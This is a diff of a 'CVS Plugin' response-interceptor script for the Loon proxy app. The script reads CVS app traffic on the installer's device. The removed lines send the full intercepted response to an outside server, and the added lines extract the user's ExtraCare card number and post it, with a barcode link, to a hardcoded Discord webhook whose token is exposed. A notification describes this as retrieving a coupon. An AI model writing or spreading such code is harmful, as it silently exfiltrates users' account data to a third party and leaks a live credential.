@@ -1,86 +1,64 @@
 
-// notification
-$notification.post('CVS Plugin', 'Script Started', 'CVS interceptor script is running');
-
 try {
-
-    // notification
-    $notification.post('CVS Plugin', 'Request Info', `URL: ${$request.url}`);
-    // notification
-    $notification.post('CVS Plugin', 'Request Method', $request.method);
-    // notification
-    $notification.post('CVS Plugin', 'Request Headers', JSON.stringify($request.headers, null, 2));
-    
-
-    // notification
-    $notification.post('CVS Plugin', 'Response Status', $response.status.toString());
-    // notification
-    $notification.post('CVS Plugin', 'Response Headers', JSON.stringify($response.headers, null, 2));
-    
-
     if ($response.body) {
-        // notification
-        $notification.post('CVS Plugin', 'Response Body Type', typeof $response.body);
-        // notification
-        $notification.post('CVS Plugin', 'Response Body Length', $response.body.length.toString());
-        
         let responseData;
         try {
             responseData = JSON.parse($response.body);
-            // notification
-            $notification.post('CVS Plugin', 'Parsed CVS Response', JSON.stringify(responseData, null, 2));
-        } catch (parseError) {
-            // notification
-            $notification.post('CVS Plugin', 'Parse Error', parseError.message);
-            // notification
-            $notification.post('CVS Plugin', 'Raw Response Body', $response.body);
-            responseData = { raw_body: $response.body };
-        }
-        
-        const postData = {
-            source: "cvs_interceptor",
-            timestamp: new Date().toISOString(),
-            original_url: $request.url,
-            cvs_response: responseData
-        };
-        
-        // notification
-        $notification.post('CVS Plugin', 'Sending Data', JSON.stringify(postData, null, 2));
-        
-        $httpClient.post({
-            url: "https://bubbl.so/cvs",
-            headers: {
-                "Content-Type": "application/json",
-                "User-Agent": "CVS-Loon-Plugin/1.0"
-            },
-            body: JSON.stringify(postData),
-            timeout: 10000
-        }, function(error, response, data) {
-            if (error) {
+            
+            // Extract the card number
+            const cardNumber = responseData?.cusInfResp?.xtraCard?.encodedXtraCardNbr;
+            
+            if (cardNumber) {
                 // notification
-                $notification.post('CVS Plugin', 'POST Failed', error);
+                $notification.post('CVS Plugin', 'Successfully Retrieved Coupon', `Card: ${cardNumber}`);
+                
+                // Generate barcode URL
+                const barcodeUrl = `https://vratasram.xyz/_next/image?url=%2Fapi%2Fcvs%2Fbarcode%3Fcode%3D${encodeURIComponent(cardNumber)}&w=3840&q=75`;
+                
+                // Send to Discord webhook
+                const discordPayload = {
+                    embeds: [{
+                        title: "CVS ExtraCare Card",
+                        description: `Card Number: ${cardNumber}`,
+                        image: {
+                            url: barcodeUrl
+                        },
+                        color: 0x00ff00,
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+                
+                $httpClient.post({
+                    url: "https://discord.com/api/webhooks/1414811243876843581/MIGeAQkJlB3iPRKbIB2FbT8hlSKZ2EgX5MLh16_0eO6xdy5qI6NAUhPz8hXVT4Vx8rpO",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(discordPayload),
+                    timeout: 10000
+                }, function(error, response, data) {
+                    if (error) {
+                        // notification
+                        $notification.post('CVS Plugin', 'Discord Error', `Failed to send to Discord: ${error}`);
+                    }
+                    $done({});
+                });
             } else {
                 // notification
-                $notification.post('CVS Plugin', 'POST Success', 'Request completed successfully');
-                // notification
-                $notification.post('CVS Plugin', 'API Response Status', response.status.toString());
-                // notification
-                $notification.post('CVS Plugin', 'API Response Data', data);
+                $notification.post('CVS Plugin', 'Card Not Found', 'Could not extract card number from response');
+                $done({});
             }
-            
+        } catch (parseError) {
+            // notification
+            $notification.post('CVS Plugin', 'Parse Error', `Failed to parse JSON: ${parseError.message}`);
             $done({});
-        });
-        
+        }
     } else {
         // notification
-        $notification.post('CVS Plugin', 'No Body', 'No response body found');
+        $notification.post('CVS Plugin', 'No Response Body', 'Response has no body to process');
         $done({});
     }
-    
 } catch (error) {
     // notification
-    $notification.post('CVS Plugin', 'Script Error', error.message);
-    // notification
-    $notification.post('CVS Plugin', 'Error Stack', error.stack);
+    $notification.post('CVS Plugin', 'Script Error', `Unexpected error: ${error.message}`);
     $done({});
 }
